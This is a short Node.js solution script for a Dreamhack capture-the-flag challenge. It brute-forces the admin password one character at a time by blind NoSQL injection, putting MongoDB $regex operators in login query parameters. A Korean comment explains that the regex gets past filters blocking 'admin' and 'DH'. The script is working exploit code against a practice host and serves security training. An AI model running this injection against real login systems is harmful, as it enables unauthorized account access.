const axios = require('axios');

const HOST = 'http://host1.dreamhack.games:15195';
const PW = '0123456789' + 'abcdefghijklmnopqrstuvwxyz' + 'abcdefghijklmnopqrstuvwxyz'.toUpperCase();

async function solve() {
    let flag = '';
    for (let i = 0; i < 32; i++) {
        for (let pw in PW) {
            const r = await axios.get(`${HOST}/login?uid[$regex]=adm.n&upw[$regex]=D.{${flag}${PW[pw]}`);
            if (r.data === 'admin') {
                flag += PW[pw];
                console.log(flag);
                break;
            }
        }
    }
    console.log(`DH{${flag}}`);
}

solve()


/*
[[BLIND NO SQL INJECTION]]

admin, admi 를 막았기 때문에 regex를 사용하여 우회하기 uid

DH를 막았기 때문에 regex로 하나씩 확인
*/